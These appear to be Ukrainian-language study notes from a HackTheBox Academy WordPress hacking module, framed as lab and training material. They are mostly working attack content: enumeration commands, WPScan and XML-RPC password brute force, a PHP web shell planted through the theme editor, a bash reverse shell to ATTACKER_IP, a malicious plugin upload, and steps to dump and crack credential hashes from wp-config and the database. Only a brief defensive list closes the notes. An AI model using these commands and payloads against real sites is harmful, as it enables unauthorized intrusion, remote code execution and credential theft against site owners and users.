## ℹ️ Інформація

- 🌐 **Платформа:** HackTheBox Academy
- 📚 **Модуль:** Hacking WordPress
- 🔗 **Посилання:** [Module 17 — Intro](https://academy.hackthebox.com/app/module/17/section/40)

***

## 🏗️ Структура WordPress

WordPress складається з кількох ключових директорій та файлів: [karrab7](https://karrab7.com/articles/WordPress-Pentesting-Cheatsheet)

| Шлях | Опис |
|---|---|
| `wp-config.php` | Конфіг БД (credentials, salts, debug) |
| `wp-admin/` | Панель адміністратора |
| `wp-content/` | Теми, плагіни, завантаження |
| `wp-includes/` | Основні бібліотеки ядра |
| `wp-login.php` | Сторінка входу |
| `readme.html` | Розкриває версію WordPress |
| `xmlrpc.php` | XML-RPC інтерфейс (потенційна вразливість) |
| `.htaccess` | Правила перезапису та доступу |

***

## 👥 Ролі користувачів WordPress

WordPress має 5 вбудованих ролей: [academy.hackthebox](https://academy.hackthebox.com/course/preview/hacking-wordpress)

- **Administrator** — повний контроль над сайтом
- **Editor** — керування контентом інших користувачів
- **Author** — публікує власний контент
- **Contributor** — пише, але не публікує
- **Subscriber** — лише читає

***

## 🔍 Фаза 1: Розвідка та Енумерація

### Виявлення версії WordPress

```bash
# Через readme.html
curl http://TARGET/readme.html

# Через мета-тег у HTML
curl -s http://TARGET/ | grep 'content="WordPress'

# Через RSS feed
curl http://TARGET/?feed=rss2 | grep '<generator>'

# Через wp-links-opml.php
curl http://TARGET/wp-links-opml.php
```

### Ручна енумерація користувачів

```bash
# Через author ID redirect
curl -s -I http://TARGET/?author=1

# Через REST API
curl http://TARGET/wp-json/wp/v2/users

# Через login error message (valid vs invalid user)
curl -s -X POST http://TARGET/wp-login.php \
  -d "log=admin&pwd=wrongpass" | grep -i "error"

# Через oembed endpoint
curl "http://TARGET/wp-json/oembed/1.0/embed?url=http://TARGET/sample-post/"
```

### Ручна енумерація плагінів та тем

```bash
# Плагіни — пошук у сирцях сторінки
curl -s http://TARGET/ | grep -oP 'plugins/[^/]+' | sort -u

# Теми — пошук у сирцях сторінки
curl -s http://TARGET/ | grep -oP 'themes/[^/]+' | sort -u

# Перевірка конкретного плагіна
curl -s http://TARGET/wp-content/plugins/PLUGIN_NAME/readme.txt
```

### Directory Listing

```bash
# Перевірка відкритих директорій
curl http://TARGET/wp-content/uploads/
curl http://TARGET/wp-content/plugins/
curl http://TARGET/wp-content/themes/
```

***

## 🤖 Фаза 2: WPScan — Автоматична Енумерація

### Базове сканування

```bash
wpscan --url http://TARGET/
```

### Повне сканування з API токеном

```bash
wpscan --url http://TARGET/ \
  --api-token YOUR_TOKEN \
  -e vp,vt,u \
  --plugins-detection aggressive \
  --random-user-agent \
  --verbose
```

### Флаги енумерації (`-e`) [github](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation)

| Флаг | Призначення |
|---|---|
| `u` | Користувачі |
| `vp` | Вразливі плагіни |
| `ap` | Всі плагіни |
| `p` | Популярні плагіни |
| `vt` | Вразливі теми |
| `at` | Всі теми |
| `cb` | Резервні копії конфігу |
| `tt` | Файли TimThumb |

### Брутфорс паролів

```bash
# Через стандартну форму
wpscan --url http://TARGET/ \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt

# Через XML-RPC (швидше, менш шуму)
wpscan --url http://TARGET/ \
  --password-attack xmlrpc \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  -t 30
```

***

## 💥 Фаза 3: Експлуатація

### RCE через редактор тем (Theme Editor)

Після отримання доступу адміністратора: [karrab7](https://karrab7.com/articles/WordPress-Pentesting-Cheatsheet)

```
Appearance → Theme Editor → вибрати файл (404.php або functions.php)
```

**Вставити PHP web shell:**

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**Викликати shell:**

```bash
curl "http://TARGET/wp-content/themes/THEME_NAME/404.php?cmd=id"
curl "http://TARGET/wp-content/themes/THEME_NAME/404.php?cmd=cat+/etc/passwd"
```

### Reverse Shell через Theme Editor

```bash
# На машині атакуючого — запустити listener
nc -lvnp 4444

# У веб-шелі — відправити зворотне з'єднання
curl "http://TARGET/wp-content/themes/twentytwentyone/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

### RCE через завантаження плагіна

```bash
# Створити ZIP-архів з PHP web shell як "плагін"
mkdir malicious-plugin
cat > malicious-plugin/malicious-plugin.php << 'EOF'
<?php
/**
 * Plugin Name: Malicious Plugin
 * Description: Test
 */
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
?>
EOF
zip -r malicious-plugin.zip malicious-plugin/

# Завантажити через: Plugins → Add New → Upload Plugin
```

### XML-RPC Exploit

```bash
# Перевірка доступності
curl -s http://TARGET/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Брутфорс через XML-RPC (до 999 паролів за 1 запит)
curl -s http://TARGET/xmlrpc.php \
  -d '<methodCall><methodName>wp.getUsersBlogs</methodName>
      <params><param><value>admin</value></param>
      <param><value>password123</value></param></params>
      </methodCall>'
```

***

## 🔐 Фаза 4: Після Компрометації

### Пошук credentials у wp-config.php

```bash
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"
```

### Підключення до БД

```bash
mysql -u WP_DB_USER -p -h localhost WP_DB_NAME

# Витягнути хеші паролів
SELECT user_login, user_pass FROM wp_users;
```

### Зламати хеш (WordPress використовує phpass)

```bash
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
# або
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

***

## 🛡️ Захисні заходи

- Вимкнути XML-RPC (`xmlrpc.php`) якщо не потрібен [karrab7](https://karrab7.com/articles/WordPress-Pentesting-Cheatsheet)
- Заборонити перегляд директорій у `.htaccess`: `Options -Indexes`
- Обмежити доступ до `wp-admin` по IP
- Регулярно оновлювати ядро, теми та плагіни
- Використовувати 2FA для адмін-панелі
- Видалити `readme.html` та `license.txt` (версія не повинна бути публічною)

***

## 📌 Швидкий довідник команд

```bash
# 1. Виявлення версії
curl -s http://TARGET/readme.html | grep -i "version"

# 2. Enum користувачів
wpscan --url http://TARGET/ -e u

# 3. Enum вразливих плагінів
wpscan --url http://TARGET/ -e vp --api-token TOKEN

# 4. Брутфорс
wpscan --url http://TARGET/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# 5. Повний скан
wpscan --url http://TARGET/ --api-token TOKEN -e ap,at,u --plugins-detection aggressive
```
